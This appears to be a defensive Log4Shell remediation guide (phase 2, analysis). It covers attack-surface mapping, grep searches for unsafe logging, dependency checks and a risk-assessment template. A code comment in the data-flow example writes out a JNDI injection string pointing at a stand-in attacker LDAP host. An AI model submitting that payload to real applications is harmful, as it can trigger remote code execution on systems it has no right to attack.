# Phase 2: Analysis

This guide covers how to analyze the impact of Log4Shell vulnerability in your applications.

## Overview

Once you've detected vulnerable Log4j versions, the next step is to understand the scope and potential impact of the vulnerability in your specific environment.

## Impact Assessment Framework

### Step 1: Map the Attack Surface

Identify all entry points where attacker-controlled data could reach Log4j:

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACK SURFACE MAP                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  External Inputs    ──►  Application Logic  ──►  Log4j      │
│                                                              │
│  • HTTP Headers          • Controllers           • logger.info()
│  • Query Parameters      • Services              • logger.warn()
│  • Request Body          • Filters               • logger.error()
│  • Cookies               • Interceptors          • logger.debug()
│  • Path Variables        • Exception Handlers                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Step 2: Identify Vulnerable Code Patterns

Search your codebase for dangerous logging patterns:

```bash
# Pattern 1: String concatenation in logs
grep -rn 'logger\.\(info\|warn\|error\|debug\).*+.*request\|param\|header\|input' \
    --include="*.java" src/

# Pattern 2: Logging HTTP headers
grep -rn 'getHeader\|User-Agent\|X-Forwarded' --include="*.java" src/

# Pattern 3: Logging request parameters
grep -rn 'getParameter\|@RequestParam\|@PathVariable' --include="*.java" src/ | \
    grep -v "test"
```

### Step 3: Categorize Entry Points

| Entry Point | Data Source | Logged? | Risk Level |
|-------------|-------------|---------|------------|
| /api/products/search | query param | Yes | CRITICAL |
| /api/auth/login | username (body) | Yes | CRITICAL |
| /api/orders | shippingAddress (body) | Yes | HIGH |
| /api/products/{id} | path variable | No | LOW |
| User-Agent header | HTTP header | No | - |

## Dependency Tree Analysis

### Understanding Transitive Dependencies

Log4j might be included indirectly through other libraries:

```bash
# Generate full dependency tree
mvn dependency:tree -Dincludes=org.apache.logging.log4j

# Example output showing transitive dependency:
# [INFO] com.example:ecommerce:jar:1.0.0
# [INFO] +- org.springframework.boot:spring-boot-starter-log4j2:jar:2.5.6:compile
# [INFO] |  +- org.apache.logging.log4j:log4j-slf4j-impl:jar:2.14.1:compile
# [INFO] |  |  +- org.apache.logging.log4j:log4j-api:jar:2.14.1:compile
# [INFO] |  +- org.apache.logging.log4j:log4j-core:jar:2.14.1:compile
# [INFO] |  +- org.apache.logging.log4j:log4j-jul:jar:2.14.1:compile
```

### Identify All Log4j Consumers

```bash
# Find all classes that import Log4j
grep -rn "import org.apache.logging.log4j" --include="*.java" src/

# Count by package
grep -rn "import org.apache.logging.log4j" --include="*.java" src/ | \
    cut -d: -f1 | xargs dirname | sort | uniq -c | sort -rn
```

## Code Flow Analysis

### Trace Data from Input to Log

For each critical entry point, trace the data flow:

```java
// Example: ProductController.searchProducts()

@GetMapping("/search")
public ResponseEntity<List<Product>> searchProducts(@RequestParam String query) {
    // 1. User input received from HTTP request
    // └── query = "${jndi:ldap://attacker.com/exploit}"
    
    // 2. Input passed to logger WITHOUT sanitization
    logger.info("Search query received: " + query);
    // └── Log4j processes: "Search query received: ${jndi:ldap://...}"
    // └── JNDI lookup triggered!
    
    // 3. Input passed to service
    List<Product> results = productService.searchByName(query);
    
    // 4. Service also logs the input
    // └── ProductService.searchByName() logs query again
    
    return ResponseEntity.ok(results);
}
```

### Vulnerable Pattern Categories

#### Category 1: Direct Logging (CRITICAL)
```java
// User input directly concatenated into log message
logger.info("User searched for: " + userInput);
```

#### Category 2: Exception Logging (HIGH)
```java
// User input in exception message
try {
    processOrder(orderData);
} catch (Exception e) {
    // Exception message might contain user input
    logger.error("Order processing failed: " + e.getMessage());
}
```

#### Category 3: Object ToString (MEDIUM)
```java
// Object's toString() might include user-controlled data
logger.debug("Processing order: " + order);
// Order.toString() includes shippingAddress, notes, etc.
```

## Business Impact Analysis

### Questions to Answer

1. **What data could be exposed?**
   - Database credentials
   - API keys
   - Customer PII
   - Session tokens

2. **What systems could be compromised?**
   - Web servers
   - Application servers
   - Database servers
   - Internal networks

3. **What's the blast radius?**
   - Single application
   - Multiple services
   - Entire infrastructure

### Risk Matrix

| Asset | Exposure | Impact | Risk Score |
|-------|----------|--------|------------|
| Production Web Servers | Internet-facing | Full RCE | CRITICAL |
| Internal APIs | Internal network | RCE, lateral movement | HIGH |
| Batch Processing | Limited exposure | RCE, data access | MEDIUM |
| Development/Test | No external access | Limited | LOW |

## Environment Analysis

### Network Exposure Assessment

```bash
# Check if affected services are internet-facing
netstat -tlnp | grep java
lsof -i -P | grep java

# Review firewall rules for affected ports
iptables -L -n | grep 8080

# Check if outbound LDAP/RMI is possible (indicates higher exploitability)
nc -zv ldap.example.com 389
nc -zv rmi.example.com 1099
```

### Existing Security Controls

Document what controls might mitigate the risk:

| Control | Present? | Effectiveness |
|---------|----------|---------------|
| WAF with Log4j rules | No | N/A |
| Egress filtering | Partial | Medium |
| Network segmentation | Yes | Medium |
| RASP solution | No | N/A |
| EDR on servers | Yes | Low-Medium |

## Analysis Report Template

```markdown
# Log4Shell Impact Analysis Report

## Executive Summary
- X applications affected
- Y critical, Z high-risk entry points identified
- Immediate remediation required for production systems

## Affected Components
[List from Phase 1]

## Attack Surface Analysis
[Entry points and risk levels]

## Code Analysis Results
[Vulnerable patterns found]

## Business Impact Assessment
[Data exposure, system compromise risk]

## Recommended Prioritization
1. Production customer-facing applications
2. Internal applications with sensitive data
3. Development/test environments

## Timeline for Remediation
- Immediate (24h): Apply workarounds to critical systems
- Short-term (72h): Update dependencies for critical systems
- Medium-term (1 week): Complete remediation for all systems
```

## Next Steps

After completing the analysis:
1. Proceed to [03-remediation.md](03-remediation.md) for fix implementation
2. Prioritize critical systems based on this analysis
3. Share analysis report with stakeholders

## Resources

- [Huntress Log4Shell Testing](https://log4shell.huntress.com/)
- [SANS Log4j Analysis](https://www.sans.org/blog/what-you-need-to-know-about-log4j-logging-library-vulnerability-cve-2021-44228/)
